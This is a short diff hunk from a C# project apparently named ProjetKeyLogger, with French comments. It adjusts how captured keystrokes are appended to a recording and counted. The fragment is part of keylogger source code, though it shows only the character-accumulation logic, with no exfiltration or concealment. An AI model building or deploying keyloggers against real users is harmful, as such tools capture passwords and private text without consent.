@@ -343,17 +343,11 @@ namespace ProjetKeyLogger
                                     }
                                     else
                                     {
-                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII));
+                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII).ToString());
                                     }
-                                }
-                                
-                                //Concatenation e la derniere touche tapée au contenu de l'enregistrement
-                                enregistrement.ajouterContenu((char)codeASCII);
-                                //On incrémente le nombre de caracteres tapé
-                                //!!!A mettre a chaque fois qu'un caractere est tapé!!!
-                               
-                                break;
+                                }break;
                         }
+                        //On incrémente le nombre de caracteres tapé
                         nb_caractere_tape += 1;
                     }
 
